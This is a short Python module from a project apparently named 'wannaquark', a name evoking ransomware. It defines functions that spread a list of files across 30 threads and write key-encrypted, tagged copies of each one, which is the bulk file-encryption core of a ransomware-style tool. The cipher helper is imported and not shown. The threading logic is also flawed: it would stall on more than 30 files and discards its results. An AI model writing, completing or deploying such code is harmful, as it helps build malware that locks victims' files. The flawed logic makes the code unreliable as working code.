
from wannaquark.utils.constants import Constants as Cte
from wannaquark.utils.tools import change_bits, get_file_ext
from threading import Thread
from queue import Queue
import logging


def encrypt(key, q, list_successful):
    input_filename = q.get()
    if Cte.ENCRYPT_TAG not in input_filename:
        file_ext = get_file_ext(input_filename)
        encrypted_filename = input_filename.replace(file_ext, f'_{Cte.ENCRYPT_TAG}{file_ext}')
        successful = change_bits(input_filename, encrypted_filename, key)
        list_successful.append(successful)
        logging.info(f'File {input_filename} encrypted {successful}')
    q.task_done()


def write_encrypt(list_input_filename, key):
    successful_encryptions = []
    q = Queue()
    for file in list_input_filename:
        q.put(file)
    for i in range(30):
        thread = Thread(target=encrypt, args=(key, q, successful_encryptions,), daemon=True)
        thread.start()
    q.join()



























